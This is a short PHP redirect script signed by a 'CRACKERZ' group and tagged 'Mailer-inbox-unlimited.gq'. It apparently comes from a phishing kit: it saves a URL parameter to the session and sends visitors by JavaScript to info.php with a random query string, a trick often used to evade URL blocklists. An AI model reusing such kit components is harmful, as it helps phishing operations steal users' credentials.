<?php

session_start();


/* Programmer name :

		╔╗ ╦ ╦  ╔═╗╦═╗╔═╗╔═╗╦╔═╔═╗╦═╗╔═╗
		╠╩╗╚╦╝  ║  ╠╦╝╠═╣║  ╠╩╗║╣ ╠╦╝╔═╝
		╚═╝ ╩   ╚═╝╩╚═╩ ╩╚═╝╩ ╩╚═╝╩╚═╚═╝

 				#2018  Mailer-inbox-unlimited.gq  */

		
$more = $_GET['time'];

$_SESSION['moretime'] = $more;

$rand = substr(str_shuffle(str_repeat("0123456789abcdefghijklmnopqrstuvwxyz", 5)), 0, 20); 

$too = 'info.php?'.$rand;

//header('Location:'.$too);

echo '<script type="text/javascript">window.location.replace("'.$too.'");</script>';

?>